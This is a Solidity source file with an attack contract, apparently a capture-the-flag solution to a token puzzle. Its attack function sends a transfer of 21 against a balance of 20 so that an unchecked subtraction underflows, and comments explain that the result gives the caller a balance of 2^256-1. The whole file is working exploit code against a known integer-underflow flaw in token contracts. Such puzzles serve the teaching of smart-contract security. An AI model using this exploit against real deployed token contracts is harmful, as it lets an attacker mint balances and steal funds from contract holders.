// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract TokenAttack is Broadcasted {
    uint256 internal constant OVERFLOW_VALUE = 20 + 1; // balance + 1

    function attack(address payable tokenCtr_) public payable override {
        IToken(tokenCtr_).transfer(msg.sender, OVERFLOW_VALUE);
    }
}

interface IToken {
    // ! your balance is 20, in order to get more have to overflow the uint256 by sending more than you have
    // ! 20 -21 = will overflow resulting in 2^256-1 a really big number
    function transfer(address _to, uint256 _value) external returns (bool);
}
